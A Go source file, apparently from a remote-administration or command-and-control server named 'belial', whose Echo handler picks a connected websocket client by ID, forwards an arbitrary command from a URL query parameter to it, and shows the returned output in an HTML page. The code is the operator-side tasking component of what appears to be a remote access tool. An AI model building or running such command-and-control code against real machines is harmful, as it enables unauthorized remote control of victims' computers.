package controllers

import (
	"belial/Server/pkg/websocket"
	"github.com/labstack/echo/v4"
	"net/http"
)

var (
	response = make(chan string)
)

func Command(pool *websocket.Pool) func(c echo.Context) error {
	return func(c echo.Context) error {
		var client *websocket.Client
		for v, _ := range pool.Clients {
			if v.ID == c.Param("id") {
				client = v
				break
			}
		}

		if client.ID == "" {
			return c.String(http.StatusOK, "Client not found")
		}

		if c.QueryParam("cmd") != "" {
			err := client.Conn.WriteMessage(1, []byte(c.QueryParam("cmd")))
			if err != nil {
				return c.String(http.StatusInternalServerError, err.Error())
			}
			for {
				select {
				case this := <-response:
					return c.HTML(http.StatusOK, "<code>"+this+"</code><h1>Command sent </br> <a href='/client'>Back</a></h1>")
				}
			}
		}

		return c.JSON(http.StatusNotFound, "Command not found")
	}
}
